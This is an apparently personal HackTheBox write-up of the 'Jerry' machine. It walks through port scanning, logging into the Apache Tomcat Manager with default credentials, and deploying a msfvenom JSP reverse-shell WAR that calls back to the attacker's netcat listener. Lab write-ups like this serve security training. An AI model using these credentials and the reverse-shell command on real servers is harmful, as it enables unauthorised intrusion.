---
Platform:
  - HackTheBox
Category: Web
Difficulty: Easy
tags:
  - RCE
  - arbitrary-file-upload
  - default-credentials
Status: Rooted/Finished
Blog Posting: Not Posted
Type: Machine
---
Hello everyone, In this blog we are going to solve Jerry from HackTheBox.

Link for the machine : [https://app.hackthebox.com/machines/Jerry](https://app.hackthebox.com/machines/Jerry)

  

Lets Start ðŸ™Œ

  

Connect to the HTB server by using the OpenVpn configuration file thatâ€™s generated by HTB.

[ [Click Here](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access) to learn more about how to connect to vpn and access the boxes. ]

After connecting to the vpn service, click on Join Machine to access the machineâ€™s ip.

After joining the machine you can see the IP Address of the target machine.

  

First start the reconnaissance by running `rustscan` on the target IP address.

Command: `rustscan -a 10.10.10.95 -- -A -T4 -v -Pn`

![[Jerry/assets/Untitled.png|Untitled.png]]

![[Jerry/assets/Untitled 1.png|Untitled 1.png]]

From the results of `rustscan`, we can see that on port `8080`, Apache Tomcat service is running.

I visited the web server running on `http://10.10.10.95:8080/`.

![[Jerry/assets/Untitled 2.png|Untitled 2.png]]

We can see the default home page of the Apache Tomcat server. I started exploring by clicking all the buttons and links in the home page.

![[Jerry/assets/Untitled 3.png|Untitled 3.png]]

I clicked the Manager App button and it redirected me to the following link: [http://10.10.10.95:8080/manager/html](http://10.10.10.95:8080/manager/html), which prompted me for a username and password:

![[Jerry/assets/Untitled 4.png|Untitled 4.png]]

On investigating about the above URL, I found this [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#default-credentials](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#default-credentials)

![[Jerry/assets/Untitled 5.png|Untitled 5.png]]

So I tried `admin:admin` combination in the prompt and it thrown me the following error:

![[Jerry/assets/Untitled 6.png|Untitled 6.png]]

from the above error, we can see that they have shown a example, in which they have used `tomcat:s3cret` combination. Letâ€™s give it a try with this combination.

![[Jerry/assets/Untitled 7.png|Untitled 7.png]]

It worked and we got access to the Application Manager.

Further surfing the Application Manager, we can see that there is an option to upload files of type WAR.

![[Jerry/assets/Untitled 8.png|Untitled 8.png]]

We can generate a `msfvenom` reverse shell and upload it as mentioned here: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#msfvenom-reverse-shell](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#msfvenom-reverse-shell)

![[Jerry/assets/Untitled 9.png|Untitled 9.png]]

Generate the Reverse Shell using the following command:

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<HTB_tun_IP> LPORT=8888 -f war -o revshell.war`

![[Jerry/assets/Untitled 10.png|Untitled 10.png]]

Now upload this `revshell.war` file and click deploy.

![[Jerry/assets/Untitled 11.png|Untitled 11.png]]

Now if we check the Applications table, we can see that a new path `/revshell` is generated.

![[Jerry/assets/Untitled 12.png|Untitled 12.png]]

Before clicking or viewing the `/revshell` link, start a `netcat` listener on your attack box / local machine on port `8888`

![[Jerry/assets/Untitled 13.png|Untitled 13.png]]

Now click the `/revshell` and check the `netcat` listener.

![[Jerry/assets/Untitled 14.png|Untitled 14.png]]

![[Jerry/assets/Untitled 15.png|Untitled 15.png]]

We have successfully got access to the target machine.

Now we have to look out for the flags. I started surfing the machine. I visited the `C:\Users` directory and found the following users:

![[Jerry/assets/Untitled 16.png|Untitled 16.png]]

I checked the Administrator directory. In the Desktop folder of Administrator found the `flags` directory.

![[Jerry/assets/Untitled 17.png|Untitled 17.png]]

The flags directory had a file named `2 for the price of 1.txt`.

You can view the contents of the `2 for the price of 1.txt` file using the command: `more "2 for the price of 1.txt"`

![[Jerry/assets/Untitled 18.png|Untitled 18.png]]

We have successfully found both the user and root flags.

  

Thank You !!!!!!!